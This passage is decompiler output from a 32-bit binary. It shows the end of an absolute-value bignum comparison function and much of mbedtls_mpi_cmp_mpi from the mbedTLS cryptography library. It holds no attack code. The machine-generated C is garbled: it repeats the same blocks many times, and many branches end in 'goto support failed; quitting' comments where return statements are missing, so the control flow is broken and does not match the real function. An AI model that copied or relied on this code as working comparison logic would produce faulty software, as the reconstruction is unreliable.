                                    if (*(int32_t *)(v9 - 4 + 4 * v4) == 0) {
                                      lab_0x80564c7_2:;
                                        int32_t v21 = v4 - 1; // 0x80564c7
                                        if (v21 == 0) {
                                            // break -> 0x80564ca
                                            break;
                                        }
                                        v4 = v21;
                                        // continue -> 0x80564c0
                                        continue;
                                    } else {
                                        // 0x80564e8
                                        // branch -> 0x80564e8
                                        // 0x80564e8
                                        v3 = v4;
                                        // branch -> 0x80564d4
                                    }
                                    // 0x80564d4
                                    if (v2 < v3 || v2 != v3) {
                                        // 0x80564dd
                                        return v2 <= v3 ? -1 : 1;
                                    }
                                    // 0x80564f2
                                    if (v2 == 0) {
                                        // 0x8056528
                                        return 0;
                                    }
                                    // 0x80564f6
                                    v7 = v2 - 1;
                                    v10 = *(int32_t *)(a2 + 8);
                                    g4 = v10;
                                    v11 = *(int32_t *)(a1 + 8);
                                    v14 = 4 * v7;
                                    v12 = *(int32_t *)(v10 + v14);
                                    v13 = *(int32_t *)(v11 + v14);
                                    if (v12 < v13) {
                                        // 0x80564dd
                                        return 1;
                                    }
                                    // 0x8056507
                                    if (v12 > v13) {
                                        // 0x80564dd
                                        return -1;
                                    }
                                    // 0x805651f
                                    if (v7 == 0) {
                                        // 0x8056528
                                        return 0;
                                    }
                                    // 0x8056510
                                    v5 = v7;
                                    // branch -> 0x8056510
                                    while (true) {
                                        // 0x8056510
                                        v15 = 4 * v5;
                                        v19 = *(int32_t *)(v10 - 4 + v15);
                                        v16 = *(int32_t *)(v11 - 4 + v15);
                                        if (v16 != v19) {
                                            // 0x80564dd
                                            // branch -> 0x80564dd
                                            // 0x80564dd
                                            return v16 > v19 ? 1 : -1;
                                        }
                                      lab_0x805651c_8:;
                                        int32_t v22 = v5 - 1; // 0x805651c
                                        if (v22 == 0) {
                                            // break -> 0x805651f
                                            break;
                                        }
                                        v5 = v22;
                                        // continue -> 0x8056510
                                    }
                                    // 0x805651f
                                    // branch -> 0x8056528
                                    // 0x8056528
                                    return 0;
                                }
                            }
                            // 0x80564d0
                            if (v2 == 0) {
                                // 0x8056528
                                return 0;
                            }
                            v3 = 0;
                        } else {
                            // 0x80564e8
                            v3 = v8;
                            // branch -> 0x80564d4
                        }
                        // 0x80564d4
                        if (v2 < v3 || v2 != v3) {
                            // 0x80564dd
                            return v2 <= v3 ? -1 : 1;
                        }
                        // 0x80564f2
                        if (v2 == 0) {
                            // 0x8056528
                            return 0;
                        }
                        // 0x80564f6
                        v7 = v2 - 1;
                        v10 = *(int32_t *)(a2 + 8);
                        g4 = v10;
                        v11 = *(int32_t *)(a1 + 8);
                        v14 = 4 * v7;
                        v12 = *(int32_t *)(v10 + v14);
                        v13 = *(int32_t *)(v11 + v14);
                        if (v12 < v13) {
                            // 0x80564dd
                            return 1;
                        }
                        // 0x8056507
                        if (v12 > v13) {
                            // 0x80564dd
                            return -1;
                        }
                        // 0x805651f
                        if (v7 == 0) {
                            // 0x8056528
                            return 0;
                        }
                        // 0x8056510
                        v5 = v7;
                        // branch -> 0x8056510
                        while (true) {
                            // 0x8056510
                            v15 = 4 * v5;
                            v19 = *(int32_t *)(v10 - 4 + v15);
                            v16 = *(int32_t *)(v11 - 4 + v15);
                            if (v16 == v19) {
                                goto lab_0x805651c_8;
                            }
                            // 0x80564dd
                            // branch -> 0x80564dd
                            // 0x80564dd
                            return v16 > v19 ? 1 : -1;
                        }
                    }
                    // 0x80564d0
                    if (v2 == 0) {
                        // 0x8056528
                        return 0;
                    }
                    v3 = 0;
                    // 0x80564d4
                    if (v2 < v3 || v2 != v3) {
                        // 0x80564dd
                        return v2 <= v3 ? -1 : 1;
                    }
                    // 0x80564f2
                    if (v2 == 0) {
                        // 0x8056528
                        return 0;
                    }
                    // 0x80564f6
                    v7 = v2 - 1;
                    v10 = *(int32_t *)(a2 + 8);
                    g4 = v10;
                    v11 = *(int32_t *)(a1 + 8);
                    v14 = 4 * v7;
                    v12 = *(int32_t *)(v10 + v14);
                    v13 = *(int32_t *)(v11 + v14);
                    if (v12 < v13) {
                        // 0x80564dd
                        return 1;
                    }
                    // 0x8056507
                    if (v12 > v13) {
                        // 0x80564dd
                        return -1;
                    }
                    // 0x805651f
                    if (v7 == 0) {
                        // 0x8056528
                        return 0;
                    }
                    // 0x8056510
                    v5 = v7;
                    // branch -> 0x8056510
                    while (true) {
                        // 0x8056510
                        v15 = 4 * v5;
                        v19 = *(int32_t *)(v10 - 4 + v15);
                        v16 = *(int32_t *)(v11 - 4 + v15);
                        if (v16 == v19) {
                            goto lab_0x805651c_8;
                        }
                        // 0x80564dd
                        // branch -> 0x80564dd
                        // 0x80564dd
                        return v16 > v19 ? 1 : -1;
                    }
                }
            } else {
                v2 = 0;
            }
            // 0x80564a9
            v8 = *(int32_t *)(a2 + 4);
            if (v8 != 0) {
                // 0x80564b0
                v9 = *(int32_t *)(a2 + 8);
                v6 = v8 - 1;
                if (*(int32_t *)(v9 + 4 * v6) == 0) {
                    // 0x80564ca
                    if (v6 != 0) {
                        // 0x80564c0
                        v4 = v6;
                        // branch -> 0x80564c0
                        while (true) {
                            // 0x80564c0
                            if (*(int32_t *)(v9 - 4 + 4 * v4) == 0) {
                                goto lab_0x80564c7_2;
                            }
                            // 0x80564e8
                            // branch -> 0x80564e8
                            // 0x80564e8
                            v3 = v4;
                            // branch -> 0x80564d4
                            // 0x80564d4
                            if (v2 < v3 || v2 != v3) {
                                // 0x80564dd
                                return v2 <= v3 ? -1 : 1;
                            }
                            // 0x80564f2
                            if (v2 == 0) {
                                // 0x8056528
                                return 0;
                            }
                            // 0x80564f6
                            v7 = v2 - 1;
                            v10 = *(int32_t *)(a2 + 8);
                            g4 = v10;
                            v11 = *(int32_t *)(a1 + 8);
                            v14 = 4 * v7;
                            v12 = *(int32_t *)(v10 + v14);
                            v13 = *(int32_t *)(v11 + v14);
                            if (v12 < v13) {
                                // 0x80564dd
                                return 1;
                            }
                            // 0x8056507
                            if (v12 > v13) {
                                // 0x80564dd
                                return -1;
                            }
                            // 0x805651f
                            if (v7 == 0) {
                                // 0x8056528
                                return 0;
                            }
                            // 0x8056510
                            v5 = v7;
                            // branch -> 0x8056510
                            while (true) {
                                // 0x8056510
                                v15 = 4 * v5;
                                v19 = *(int32_t *)(v10 - 4 + v15);
                                v16 = *(int32_t *)(v11 - 4 + v15);
                                if (v16 == v19) {
                                    goto lab_0x805651c_8;
                                }
                                // 0x80564dd
                                // branch -> 0x80564dd
                                // 0x80564dd
                                return v16 > v19 ? 1 : -1;
                            }
                        }
                    }
                    // 0x80564d0
                    if (v2 == 0) {
                        // 0x8056528
                        return 0;
                    }
                    v3 = 0;
                } else {
                    // 0x80564e8
                    v3 = v8;
                    // branch -> 0x80564d4
                }
                // 0x80564d4
                if (v2 < v3 || v2 != v3) {
                    // 0x80564dd
                    return v2 <= v3 ? -1 : 1;
                }
                // 0x80564f2
                if (v2 == 0) {
                    // 0x8056528
                    return 0;
                }
                // 0x80564f6
                v7 = v2 - 1;
                v10 = *(int32_t *)(a2 + 8);
                g4 = v10;
                v11 = *(int32_t *)(a1 + 8);
                v14 = 4 * v7;
                v12 = *(int32_t *)(v10 + v14);
                v13 = *(int32_t *)(v11 + v14);
                if (v12 < v13) {
                    // 0x80564dd
                    return 1;
                }
                // 0x8056507
                if (v12 > v13) {
                    // 0x80564dd
                    return -1;
                }
                // 0x805651f
                if (v7 == 0) {
                    // 0x8056528
                    return 0;
                }
                // 0x8056510
                v5 = v7;
                // branch -> 0x8056510
                while (true) {
                    // 0x8056510
                    v15 = 4 * v5;
                    v19 = *(int32_t *)(v10 - 4 + v15);
                    v16 = *(int32_t *)(v11 - 4 + v15);
                    if (v16 == v19) {
                        goto lab_0x805651c_8;
                    }
                    // 0x80564dd
                    // branch -> 0x80564dd
                    // 0x80564dd
                    return v16 > v19 ? 1 : -1;
                }
            }
            // 0x80564d0
            if (v2 == 0) {
                // 0x8056528
                return 0;
            }
            v3 = 0;
            // 0x80564d4
            if (v2 < v3 || v2 != v3) {
                // 0x80564dd
                return v2 <= v3 ? -1 : 1;
            }
            // 0x80564f2
            if (v2 == 0) {
                // 0x8056528
                return 0;
            }
            // 0x80564f6
            v7 = v2 - 1;
            v10 = *(int32_t *)(a2 + 8);
            g4 = v10;
            v11 = *(int32_t *)(a1 + 8);
            v14 = 4 * v7;
            v12 = *(int32_t *)(v10 + v14);
            v13 = *(int32_t *)(v11 + v14);
            if (v12 < v13) {
                // 0x80564dd
                return 1;
            }
            // 0x8056507
            if (v12 > v13) {
                // 0x80564dd
                return -1;
            }
            // 0x805651f
            if (v7 == 0) {
                // 0x8056528
                return 0;
            }
            // 0x8056510
            v5 = v7;
            // branch -> 0x8056510
            while (true) {
                // 0x8056510
                v15 = 4 * v5;
                v19 = *(int32_t *)(v10 - 4 + v15);
                v16 = *(int32_t *)(v11 - 4 + v15);
                if (v16 == v19) {
                    goto lab_0x805651c_8;
                }
                // 0x80564dd
                // branch -> 0x80564dd
                // 0x80564dd
                return v16 > v19 ? 1 : -1;
            }
        } else {
            v2 = v1;
        }
    }
    // 0x80564a9
    v8 = *(int32_t *)(a2 + 4);
    if (v8 != 0) {
        // 0x80564b0
        v9 = *(int32_t *)(a2 + 8);
        v6 = v8 - 1;
        if (*(int32_t *)(v9 + 4 * v6) == 0) {
            // 0x80564ca
            if (v6 != 0) {
                // 0x80564c0
                v4 = v6;
                // branch -> 0x80564c0
                while (true) {
                    // 0x80564c0
                    if (*(int32_t *)(v9 - 4 + 4 * v4) == 0) {
                        goto lab_0x80564c7_2;
                    }
                    // 0x80564e8
                    // branch -> 0x80564e8
                    // 0x80564e8
                    v3 = v4;
                    // branch -> 0x80564d4
                    // 0x80564d4
                    if (v2 < v3 || v2 != v3) {
                        // 0x80564dd
                        return v2 <= v3 ? -1 : 1;
                    }
                    // 0x80564f2
                    if (v2 == 0) {
                        // 0x8056528
                        return 0;
                    }
                    // 0x80564f6
                    v7 = v2 - 1;
                    v10 = *(int32_t *)(a2 + 8);
                    g4 = v10;
                    v11 = *(int32_t *)(a1 + 8);
                    v14 = 4 * v7;
                    v12 = *(int32_t *)(v10 + v14);
                    v13 = *(int32_t *)(v11 + v14);
                    if (v12 < v13) {
                        // Detected a possible infinite recursion (goto support failed); quitting...
                    }
                    // 0x8056507
                    if (v12 > v13) {
                        // Detected a possible infinite recursion (goto support failed); quitting...
                    }
                    // 0x805651f
                    if (v7 == 0) {
                        // 0x8056528
                        return 0;
                    }
                    // 0x8056510
                    v5 = v7;
                    // branch -> 0x8056510
                    while (true) {
                        // 0x8056510
                        v15 = 4 * v5;
                        v16 = *(int32_t *)(v11 - 4 + v15);
                        if (v16 == *(int32_t *)(v10 - 4 + v15)) {
                            goto lab_0x805651c_8;
                        }
                        // 0x80564dd
                        // branch -> 0x80564dd
                        // Detected a possible infinite recursion (goto support failed); quitting...
                    }
                }
            }
            // 0x80564d0
            if (v2 == 0) {
                // 0x8056528
                return 0;
            }
            v3 = 0;
        } else {
            // 0x80564e8
            v3 = v8;
            // branch -> 0x80564d4
        }
        // 0x80564d4
        if (v2 < v3 || v2 != v3) {
            // Detected a possible infinite recursion (goto support failed); quitting...
        }
        // 0x80564f2
        if (v2 == 0) {
            // 0x8056528
            return 0;
        }
        // 0x80564f6
        v7 = v2 - 1;
        v10 = *(int32_t *)(a2 + 8);
        g4 = v10;
        v11 = *(int32_t *)(a1 + 8);
        v14 = 4 * v7;
        v12 = *(int32_t *)(v10 + v14);
        v13 = *(int32_t *)(v11 + v14);
        if (v12 < v13) {
            // Detected a possible infinite recursion (goto support failed); quitting...
        }
        // 0x8056507
        if (v12 > v13) {
            // Detected a possible infinite recursion (goto support failed); quitting...
        }
        // 0x805651f
        if (v7 == 0) {
            // 0x8056528
            return 0;
        }
        // 0x8056510
        v5 = v7;
        // branch -> 0x8056510
        while (true) {
            // 0x8056510
            v15 = 4 * v5;
            v16 = *(int32_t *)(v11 - 4 + v15);
            if (v16 == *(int32_t *)(v10 - 4 + v15)) {
                goto lab_0x805651c_8;
            }
            // 0x80564dd
            // branch -> 0x80564dd
            // Detected a possible infinite recursion (goto support failed); quitting...
        }
    }
    // 0x80564d0
    if (v2 == 0) {
        // 0x8056528
        return 0;
    }
    v3 = 0;
    // 0x80564d4
    if (v2 < v3 || v2 != v3) {
        // Detected a possible infinite recursion (goto support failed); quitting...
    }
    // 0x80564f2
    if (v2 == 0) {
        // 0x8056528
        return 0;
    }
    // 0x80564f6
    v7 = v2 - 1;
    v10 = *(int32_t *)(a2 + 8);
    g4 = v10;
    v11 = *(int32_t *)(a1 + 8);
    v14 = 4 * v7;
    v12 = *(int32_t *)(v10 + v14);
    v13 = *(int32_t *)(v11 + v14);
    if (v12 < v13) {
        // Detected a possible infinite recursion (goto support failed); quitting...
    }
    // 0x8056507
    if (v12 > v13) {
        // Detected a possible infinite recursion (goto support failed); quitting...
    }
    // 0x805651f
    if (v7 == 0) {
        // 0x8056528
        return 0;
    }
    // 0x8056510
    v5 = v7;
    // branch -> 0x8056510
    while (true) {
        // 0x8056510
        v15 = 4 * v5;
        v16 = *(int32_t *)(v11 - 4 + v15);
        if (v16 == *(int32_t *)(v10 - 4 + v15)) {
            goto lab_0x805651c_8;
        }
        // 0x80564dd
        // branch -> 0x80564dd
        // Detected a possible infinite recursion (goto support failed); quitting...
    }
}

// Address range: 0x8056540 - 0x805662f
int32_t mbedtls_mpi_cmp_mpi(int32_t * a1, int32_t * a2) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = (int32_t)a2;
    int32_t v3 = *(int32_t *)(v1 + 4); // 0x805654c
    g4 = v3;
    uint32_t v4 = 0; // 0x80565c5
    int32_t * v5; // 0x8056580_0
    int32_t v6;
    uint32_t v7;
    uint32_t result; // 0x80565aa
    int32_t v8; // 0x8056609
    int32_t v9; // 0x8056597
    int32_t v10; // 0x80565e4
    int32_t v11; // 0x8056583
    int32_t v12; // 0x80565c5
    int32_t v13; // 0x8056579
    int32_t v14; // 0x8056580
    int32_t v15; // 0x80565c2
    int32_t v16; // 0x80565c8
    uint32_t v17; // 0x80565cb
    uint32_t v18; // 0x80565ce
    int32_t v19; // 0x80565cb
    int32_t v20; // 0x80565d8
    uint32_t v21; // 0x80565d8
    uint32_t v22; // 0x80565dc
    if (v3 != 0) {
        int32_t v23 = *(int32_t *)(v1 + 8); // 0x8056553
        int32_t v24 = v3 - 1; // 0x8056556
        if (*(int32_t *)(v23 + 4 * v24) == 0) {
            // 0x8056573
            g4 = v24;
            if (v24 != 0) {
                // branch -> 0x8056568
                while (true) {
                    // 0x8056568
                    if (*(int32_t *)(v23 - 4 + 4 * v24) == 0) {
                        int32_t v25 = v24 - 1; // 0x8056570
                        g4 = v25;
                        if (v25 == 0) {
                            v4 = 0;
                            // break -> 0x8056573
                            break;
                        }
                        v24 = v25;
                        // continue -> 0x8056568
                        continue;
                    } else {
                        // 0x8056568
                        v4 = v24;
                        // branch -> 0x8056579
                    }
                    // 0x8056579
                    v13 = *(int32_t *)(v2 + 4);
                    g6 = v13;
                    if (v13 == 0) {
                        // 0x80565a0
                        if (v4 == 0) {
                            // 0x80565eb
                            // branch -> 0x80565ed
                            // 0x80565ed
                            g2 = v6;
                            return 0;
                        }
                        // 0x80565a4
                        // branch -> 0x8056602
                        // 0x8056602
                        g2 = v6;
                        return *a1;
                    }
                    // 0x8056580
                    v5 = (int32_t *)(v2 + 8);
                    v14 = *v5;
                    v11 = v13 - 1;
                    if (*(int32_t *)(v14 + 4 * v11) != 0) {
                        v7 = v13;
                        // 0x80565fc
                        if (v7 >= v4) {
                            // 0x80565a8
                            if (v7 != v4) {
                                // 0x8056610
                                g2 = v6;
                                return -*a2;
                            }
                            // 0x80565aa
                            result = *a1;
                            v8 = *a2;
                            g6 = v8;
                            if (result >= 1) {
                                // 0x80565b2
                                if (v8 < 0) {
                                    // 0x805661d
                                    // branch -> 0x80565ed
                                    // 0x80565ed
                                    g2 = v6;
                                    return 1;
                                }
                            }
                            // 0x80565b8
                            if (v8 >= 1) {
                                // 0x8056624
                                if (result <= 0) {
                                    // 0x8056628
                                    // branch -> 0x80565ed
                                    // 0x80565ed
                                    g2 = v6;
                                    return -1;
                                }
                            }
                            // 0x80565bc
                            if (v4 == 0) {
                                // 0x80565eb
                                // branch -> 0x80565ed
                                // 0x80565ed
                                g2 = v6;
                                return 0;
                            }
                            // 0x80565c2
                            v15 = *v5;
                            v12 = v4 - 1;
                            g6 = v12;
                            v16 = *(int32_t *)(v1 + 8);
                            v19 = 4 * v12;
                            v17 = *(int32_t *)(v15 + v19);
                            g4 = v17;
                            v18 = *(int32_t *)(v16 + v19);
                            if (v18 <= v17) {
                                // 0x80565d3
                                if (v18 < v17) {
                                    // 0x8056619
                                    // branch -> 0x80565ed
                                    // 0x80565ed
                                    g2 = v6;
                                    return -result;
                                }
                                // 0x80565e7
                                if (v12 == 0) {
                                    // 0x80565eb
                                    // branch -> 0x80565ed
                                    // 0x80565ed
                                    g2 = v6;
                                    return 0;
                                }
                                // 0x80565d8
                                v10 = v12;
                                // branch -> 0x80565d8
                                while (true) {
                                    // 0x80565d8
                                    v20 = 4 * v10;
                                    v21 = *(int32_t *)(v15 - 4 + v20);
                                    g4 = v21;
                                    v22 = *(int32_t *)(v16 - 4 + v20);
                                    if (v22 <= v21) {
                                        goto lab_0x80565e2_5;
                                    }
                                    // 0x80565ed
                                    // branch -> 0x80565ed
                                    // 0x80565ed
                                    g2 = v6;
                                    return result;
                                }
                            }
                            // 0x80565ed
                            g2 = v6;
                            return result;
                        }
                        // 0x8056602
                        g2 = v6;
                        return *a1;
                    }
                    // 0x805659a
                    g6 = v11;
                    if (v11 != 0) {
                        // 0x8056590
                        v9 = v11;
                        // branch -> 0x8056590
                        while (true) {
                            // 0x8056590
                            if (*(int32_t *)(v14 - 4 + 4 * v9) == 0) {
                              lab_0x8056597_2:;
                                int32_t v26 = v9 - 1; // 0x8056597
                                g6 = v26;
                                if (v26 == 0) {
                                    // break -> 0x805659a
                                    break;
                                }
                                v9 = v26;
                                // continue -> 0x8056590
                                continue;
                            } else {
                                // 0x80565f8
                                v7 = v9;
                                // branch -> 0x80565fc
                                // 0x80565fc
                                if (v7 >= v4) {
                                    // 0x80565a8
                                    if (v7 != v4) {
                                        // 0x8056610
                                        g2 = v6;
                                        return -*a2;
                                    }
                                    // 0x80565aa
                                    result = *a1;
                                    v8 = *a2;
                                    g6 = v8;
                                    if (result >= 1) {
                                        // 0x80565b2
                                        if (v8 < 0) {
                                            // 0x805661d
                                            // branch -> 0x80565ed
                                            // 0x80565ed
                                            g2 = v6;
                                            return 1;
                                        }
                                    }
                                    // 0x80565b8
                                    if (v8 >= 1) {
                                        // 0x8056624
                                        if (result <= 0) {
                                            // 0x8056628
                                            // branch -> 0x80565ed
                                            // 0x80565ed
                                            g2 = v6;
                                            return -1;
                                        }
                                    }
                                    // 0x80565bc
                                    if (v4 == 0) {
                                        // 0x80565eb
                                        // branch -> 0x80565ed
                                        // 0x80565ed
                                        g2 = v6;
                                        return 0;
                                    }
                                    // 0x80565c2
                                    v15 = *v5;
                                    v12 = v4 - 1;
                                    g6 = v12;
                                    v16 = *(int32_t *)(v1 + 8);
                                    v19 = 4 * v12;
                                    v17 = *(int32_t *)(v15 + v19);
                                    g4 = v17;
                                    v18 = *(int32_t *)(v16 + v19);
                                    if (v18 <= v17) {
                                        // 0x80565d3
                                        if (v18 < v17) {
                                            // 0x8056619
                                            // branch -> 0x80565ed
                                            // 0x80565ed
                                            g2 = v6;
                                            return -result;
                                        }
                                        // 0x80565e7
                                        if (v12 == 0) {
                                            // 0x80565eb
                                            // branch -> 0x80565ed
                                            // 0x80565ed
                                            g2 = v6;
                                            return 0;
                                        }
                                        // 0x80565d8
                                        v10 = v12;
                                        // branch -> 0x80565d8
                                        while (true) {
                                            // 0x80565d8
                                            v20 = 4 * v10;
                                            v21 = *(int32_t *)(v15 - 4 + v20);
                                            g4 = v21;
                                            v22 = *(int32_t *)(v16 - 4 + v20);
                                            if (v22 > v21) {
                                                // 0x80565ed
                                                // branch -> 0x80565ed
                                                // 0x80565ed
                                                g2 = v6;
                                                return result;
                                            }
                                          lab_0x80565e2_5:
                                            // 0x80565e2
                                            if (v22 < v21) {
                                                // 0x8056619
                                                // branch -> 0x8056619
                                                // 0x8056619
                                                // branch -> 0x80565ed
                                                // 0x80565ed
                                                g2 = v6;
                                                return -result;
                                            }
                                            int32_t v27 = v10 - 1; // 0x80565e4
                                            g6 = v27;
                                            if (v27 == 0) {
                                                // break -> 0x80565e7
                                                break;
                                            }
                                            v10 = v27;
                                            // continue -> 0x80565d8
                                            continue;
                                        }
                                        // 0x80565e7
                                        // branch -> 0x80565eb
                                        // 0x80565eb
                                        // branch -> 0x80565ed
                                        // 0x80565ed
                                        g2 = v6;
                                        return 0;
                                    }
                                    // 0x80565ed
                                    g2 = v6;
                                    return result;
                                }
                            }
                            // 0x8056602
                            g2 = v6;
                            return *a1;
                        }
                    }
                    // 0x80565a0
                    if (v4 == 0) {
                        // 0x80565eb
                        // branch -> 0x80565ed
                        // 0x80565ed
                        g2 = v6;
                        return 0;
                    }
                    // 0x80565a4
                    // branch -> 0x8056602
                    // 0x8056602
                    g2 = v6;
                    return *a1;
                }
            } else {
                v4 = 0;
            }
            // 0x8056579
            v13 = *(int32_t *)(v2 + 4);
            g6 = v13;
            if (v13 != 0) {
                // 0x8056580
                v5 = (int32_t *)(v2 + 8);
                v14 = *v5;
                v11 = v13 - 1;
                if (*(int32_t *)(v14 + 4 * v11) == 0) {
                    // 0x805659a
                    g6 = v11;
                    if (v11 != 0) {
                        // 0x8056590
                        v9 = v11;
                        // branch -> 0x8056590
                        while (true) {
                            // 0x8056590
                            if (*(int32_t *)(v14 - 4 + 4 * v9) == 0) {
                                goto lab_0x8056597_2;
                            }
                            // 0x80565f8
                            v7 = v9;
                            // branch -> 0x80565fc
                            // 0x80565fc
                            if (v7 < v4) {
                                // 0x8056602
                                g2 = v6;
                                return *a1;
                            }
                            // 0x80565a8
                            if (v7 != v4) {
                                // 0x8056610
                                g2 = v6;
                                return -*a2;
                            }
                            // 0x80565aa
                            result = *a1;
                            v8 = *a2;
                            g6 = v8;
                            if (result >= 1) {
                                // 0x80565b2
                                if (v8 < 0) {
                                    // 0x805661d
                                    // branch -> 0x80565ed
                                    // 0x80565ed
                                    g2 = v6;
                                    return 1;
                                }
                            }
                            // 0x80565b8
                            if (v8 >= 1) {
                                // 0x8056624
                                if (result <= 0) {
                                    // 0x8056628
                                    // branch -> 0x80565ed
                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                }
                            }
                            // 0x80565bc
                            if (v4 == 0) {
                                // 0x80565eb
                                // branch -> 0x80565ed
                                // Detected a possible infinite recursion (goto support failed); quitting...
                            } else {
                                // 0x80565c2
                                v15 = *v5;
                                v12 = v4 - 1;
                                g6 = v12;
                                v16 = *(int32_t *)(v1 + 8);
                                v19 = 4 * v12;
                                v17 = *(int32_t *)(v15 + v19);
                                g4 = v17;
                                v18 = *(int32_t *)(v16 + v19);
                                if (v18 <= v17) {
                                    // 0x80565d3
                                    if (v18 < v17) {
                                        // 0x8056619
                                        // branch -> 0x80565ed
                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                    } else {
                                        // 0x80565e7
                                        if (v12 == 0) {
                                            // 0x80565eb
                                            // branch -> 0x80565ed
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        } else {
                                            // 0x80565d8
                                            v10 = v12;
                                            // branch -> 0x80565d8
                                            while (true) {
                                                // 0x80565d8
                                                v20 = 4 * v10;
                                                v21 = *(int32_t *)(v15 - 4 + v20);
                                                g4 = v21;
                                                v22 = *(int32_t *)(v16 - 4 + v20);
                                                if (v22 <= v21) {
                                                    goto lab_0x80565e2_5;
                                                }
                                                // 0x80565ed
                                                // branch -> 0x80565ed
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            }
                                        }
                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                    }
                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                }
                            }
                            // Detected a possible infinite recursion (goto support failed); quitting...
                        }
                    }
                    // 0x80565a0
                    if (v4 != 0) {
                        // 0x80565a4
                        // branch -> 0x8056602
                        // 0x8056602
                        g2 = v6;
                        return *a1;
                    }
                    // 0x80565eb
                    // branch -> 0x80565ed
                    // Detected a possible infinite recursion (goto support failed); quitting...
                } else {
                    v7 = v13;
                    // 0x80565fc
                    if (v7 >= v4) {
                        // 0x80565a8
                        if (v7 != v4) {
                            // 0x8056610
                            g2 = v6;
                            return -*a2;
                        }
                        // 0x80565aa
                        result = *a1;
                        v8 = *a2;
                        g6 = v8;
                        if (result >= 1) {
                            // 0x80565b2
                            if (v8 < 0) {
                                // 0x805661d
                                // branch -> 0x80565ed
                                // Detected a possible infinite recursion (goto support failed); quitting...
                            }
                        }
                        // 0x80565b8
                        if (v8 >= 1) {
                            // 0x8056624
                            if (result <= 0) {
                                // 0x8056628
                                // branch -> 0x80565ed
                                // Detected a possible infinite recursion (goto support failed); quitting...
                            }
                        }
                        // 0x80565bc
                        if (v4 == 0) {
                            // 0x80565eb
                            // branch -> 0x80565ed
                        } else {
                            // 0x80565c2
                            v15 = *v5;
                            v12 = v4 - 1;
                            g6 = v12;
                            v16 = *(int32_t *)(v1 + 8);
                            v19 = 4 * v12;
                            v17 = *(int32_t *)(v15 + v19);
                            g4 = v17;
                            v18 = *(int32_t *)(v16 + v19);
                            if (v18 <= v17) {
                                // 0x80565d3
                                if (v18 < v17) {
                                    // 0x8056619
                                    // branch -> 0x80565ed
                                } else {
                                    // 0x80565e7
                                    if (v12 == 0) {
                                        // 0x80565eb
                                        // branch -> 0x80565ed
                                    } else {
                                        // 0x80565d8
                                        v10 = v12;
                                        // branch -> 0x80565d8
                                        while (true) {
                                            // 0x80565d8
                                            v20 = 4 * v10;
                                            v21 = *(int32_t *)(v15 - 4 + v20);
                                            g4 = v21;
                                            v22 = *(int32_t *)(v16 - 4 + v20);
                                            if (v22 <= v21) {
                                                goto lab_0x80565e2_5;
                                            }
                                            // 0x80565ed
                                            // branch -> 0x80565ed
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        }
                                    }
                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                }
                                // Detected a possible infinite recursion (goto support failed); quitting...
                            }
                        }
                        // Detected a possible infinite recursion (goto support failed); quitting...
                    }
                }
                // 0x8056602
                g2 = v6;
                return *a1;
            }
            // 0x80565a0
            if (v4 != 0) {
                // 0x80565a4
                // branch -> 0x8056602
                // 0x8056602
                g2 = v6;
                return *a1;
            }
            // 0x80565eb
            // branch -> 0x80565ed
            // Detected a possible infinite recursion (goto support failed); quitting...
        } else {
            v4 = v3;
        }
    }
    // 0x8056579
    v13 = *(int32_t *)(v2 + 4);
    g6 = v13;
    if (v13 != 0) {
        // 0x8056580
        v5 = (int32_t *)(v2 + 8);
        v14 = *v5;
        v11 = v13 - 1;
        if (*(int32_t *)(v14 + 4 * v11) == 0) {
            // 0x805659a
            g6 = v11;
            if (v11 != 0) {
                // 0x8056590
                v9 = v11;
                // branch -> 0x8056590
                while (true) {
                    // 0x8056590
                    if (*(int32_t *)(v14 - 4 + 4 * v9) == 0) {
                        goto lab_0x8056597_2;
                    }
                    // 0x80565f8
                    v7 = v9;
                    // branch -> 0x80565fc
                    // 0x80565fc
                    if (v7 < v4) {
                        // 0x8056602
                        g2 = v6;
                        return *a1;
                    }
                    // 0x80565a8
                    if (v7 != v4) {
                        // 0x8056610
                        g2 = v6;
                        return -*a2;
                    }
                    // 0x80565aa
                    result = *a1;
                    v8 = *a2;
                    g6 = v8;
                    if (result >= 1) {
                        // 0x80565b2
                        if (v8 < 0) {
                            // 0x805661d
                            // branch -> 0x80565ed
                            // Detected a possible infinite recursion (goto support failed); quitting...
                        }
                    }
                    // 0x80565b8
                    if (v8 >= 1) {
                        // 0x8056624
                        if (result <= 0) {
                            // 0x8056628
                            // branch -> 0x80565ed
                            // Detected a possible infinite recursion (goto support failed); quitting...
                        }
                    }
                    // 0x80565bc
                    if (v4 == 0) {
                        // 0x80565eb
                        // branch -> 0x80565ed
                        // Detected a possible infinite recursion (goto support failed); quitting...
                    } else {
                        // 0x80565c2
                        v15 = *v5;
                        v12 = v4 - 1;
                        g6 = v12;
                        v16 = *(int32_t *)(v1 + 8);
                        v19 = 4 * v12;
                        v17 = *(int32_t *)(v15 + v19);
                        g4 = v17;
                        v18 = *(int32_t *)(v16 + v19);
                        if (v18 <= v17) {
                            // 0x80565d3
                            if (v18 < v17) {
                                // 0x8056619
                                // branch -> 0x80565ed
                                // Detected a possible infinite recursion (goto support failed); quitting...
                            } else {
                                // 0x80565e7
                                if (v12 == 0) {
                                    // 0x80565eb
                                    // branch -> 0x80565ed
                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                } else {
                                    // 0x80565d8
                                    v10 = v12;
                                    // branch -> 0x80565d8
                                    while (true) {
                                        // 0x80565d8
                                        v20 = 4 * v10;
                                        v21 = *(int32_t *)(v15 - 4 + v20);
                                        g4 = v21;
                                        v22 = *(int32_t *)(v16 - 4 + v20);
                                        if (v22 <= v21) {
                                            goto lab_0x80565e2_5;
                                        }
                                        // 0x80565ed
                                        // branch -> 0x80565ed
                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                    }
                                }
                                // Detected a possible infinite recursion (goto support failed); quitting...
                            }
                            // Detected a possible infinite recursion (goto support failed); quitting...
                        }
                    }
                    // Detected a possible infinite recursion (goto support failed); quitting...
                }
            }
            // 0x80565a0
            if (v4 != 0) {
                // 0x80565a4
                // branch -> 0x8056602
                // 0x8056602
                g2 = v6;
                return *a1;
            }
            // 0x80565eb
